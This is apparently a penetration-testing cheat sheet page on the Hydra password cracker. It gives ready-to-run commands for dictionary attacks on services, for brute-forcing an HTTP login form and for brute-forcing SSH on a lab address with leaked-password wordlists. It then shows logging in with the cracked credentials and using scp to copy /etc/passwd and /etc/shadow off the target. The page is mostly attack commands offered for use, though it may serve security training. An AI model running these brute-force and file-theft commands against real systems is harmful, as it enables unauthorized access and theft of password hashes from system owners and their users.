---
description: >-
  Fast, parallelized, Network Authentication cracker -> support different
  protocols.
---

# 🐲Hydra

![](<../.gitbook/assets/image (25).png>)

{% hint style="info" %}
Hydra is based on modules, piece of code that let's Hydra attack specific protocol.
{% endhint %}

### Get info about specific module:

```
hydra -U rdp
```

### Launch 📖**Dictionary Attack** against a service:

```
hydra -L users.txt -P pass.txt <service://server> <options>
```

> \<service;//server>: for example-> \
> \- telne://target.server\
> \- http-get://localhost (pass protected web resource).
>
> \<options>: \
> \-V: show all attempts.\
> \-f stop when first correct creds&#x20;
>
> #### **Attacking an HTTP Log-in form:**

```
hydra crackeme.site http-post-form "/login.php:usr=^USER^&pwd=^PASS^:invalid credentials" -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-15.txt -f -V
```

> #### Attacking a server with SSH:

```
hydra 192.168.0.12 ssh  -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt -f -V
```

> then use the username and pass you got to connect:\
> ssh found\_username@192.168.0.12 \
>
>
> you can use telnet instead of ssh and check with:\
> telnet 192.168.0.12 -l \<found\_username>

### Download files from remote source  (SSH):

```
scp <cracked_username>@<ip>:/etc/passwd .
scp <cracked_username>@<ip>:/etc/shadow .
```

> Secure Copy Protocol (scp), used to download the files from the target machine based on SSH.&#x20;
>
> hence why we bruteforce (or obtain) SSH creds first cuz we will be asked to enter pass when we use it.
